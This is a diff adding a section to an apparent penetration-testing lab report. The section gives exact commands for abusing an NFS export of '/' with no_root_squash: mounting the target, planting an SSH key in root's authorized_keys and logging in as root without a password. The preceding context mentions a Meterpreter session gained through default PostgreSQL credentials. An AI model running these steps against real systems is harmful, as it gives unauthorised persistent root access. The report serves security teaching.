@@ -222,3 +222,34 @@ Key findings — 23 open ports in total, including several with well-known vulne
   - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
   - **Actions on Objectives:** Ran sysinfo and getuid, confirming access as the postgres user.
 - **Outcome / Impact:** Achieved code execution and a Meterpreter session under the postgres service account via default database credentials, demonstrating that weak default credentials on a database service can lead directly to remote code execution, not just data exposure.
+
+
+
+---
+
+## Exploit 7: NFS Misconfiguration - Root SSH Key Injection (Manual)
+
+- **Service / Port:** NFS / 2049 (portmapper on 111)
+- **Vulnerability:** The target exports its entire root filesystem ("/") via NFS to any host (no IP restriction), and does so without "root_squash" enabled — meaning files written as root from a remote client retain root ownership on the target instead of being downgraded to an unprivileged user.
+- **Tool Used:** Manual exploitation using native Linux tools — showmount, mount, ssh-keygen, cp, ssh (no Metasploit module used)
+- **Why This Tool:** Recon identified NFS and rpcbind exposed on ports 2049/111. No Metasploit module is needed for this class of vulnerability — the misconfiguration can be abused directly with standard NFS client tools, which is both simpler and demonstrates the value of manual technique alongside automated exploit frameworks.
+- **Steps:**
+  1. `showmount -e 192.168.100.204` — confirmed "/" is exported to all hosts ("*")
+  2. `mkdir /tmp/nfs_mount`
+  3. `sudo mount -t nfs 192.168.100.204:/ /tmp/nfs_mount` — mounted the target's entire filesystem
+  4. `ls -la /tmp/nfs_mount/root/` — confirmed root's .ssh directory exists and is writable
+  5. `ssh-keygen -t rsa -b 4096 -f ~/.ssh/nfs_exploit_key -N ""` — generated a new SSH key pair
+  6. `sudo cp ~/.ssh/nfs_exploit_key.pub /tmp/nfs_mount/root/.ssh/authorized_keys` — wrote the public key into root's authorized_keys as root (via no_root_squash)
+  7. `ls -la /tmp/nfs_mount/root/.ssh/` — confirmed the new file is owned by root:root on the target
+  8. `ssh -i ~/.ssh/nfs_exploit_key -o HostKeyAlgorithms=+ssh-rsa root@192.168.100.204` — logged in as root with no password
+  9. Confirmed access with `whoami` and `id`
+- **Evidence:** evidence/exploit7.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
+  - **Reconnaissance:** nmap identified NFS/rpcbind; showmount -e confirmed the root filesystem was exported with no host restrictions.
+  - **Weaponization:** Generating an SSH key pair prepared the "payload" — a credential that would grant persistent root access once planted.
+  - **Delivery:** Mounting the NFS share and copying the public key into root's .ssh directory delivered the payload onto the target's filesystem.
+  - **Exploitation:** The no_root_squash misconfiguration allowed the copied file to be written with root ownership, bypassing the intended privilege boundary.
+  - **Installation:** The planted authorized_keys file established a persistent, passwordless root access mechanism.
+  - **Command & Control:** The SSH session itself served as the control channel back to the target.
+  - **Actions on Objectives:** Ran whoami and id to confirm full root shell access.
+- **Outcome / Impact:** Achieved persistent, passwordless root SSH access via a pure filesystem misconfiguration, with no application vulnerability, backdoor, or weak credential involved — demonstrating that infrastructure-level misconfigurations can be just as critical as software vulnerabilities.
